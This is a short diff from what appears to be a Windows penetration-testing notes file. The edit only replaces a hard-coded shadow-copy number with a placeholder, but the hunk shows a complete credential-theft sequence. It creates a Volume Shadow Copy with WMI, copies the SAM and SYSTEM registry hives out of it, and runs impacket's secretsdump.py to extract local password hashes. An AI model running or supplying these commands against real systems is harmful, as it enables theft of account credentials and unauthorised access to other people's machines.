@@ -61,5 +61,5 @@ Run [ Windows11 ]
 $shadow = [WMIClass]"root\cimv2:Win32_ShadowCopy"
 $shadow.Create("C:\\", "ClientAccessible")
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[Number]\windows\system32\config\SAM C:\[SAM\To\Be\Saved\]
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\[SYSTEM\To\Be\Saved\]
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[Number]\windows\system32\config\SYSTEM C:\[SYSTEM\To\Be\Saved\]
 python3 /opt/impacket/examples/secretsdump.py -sam Sam -system SYSTEM LOCAL
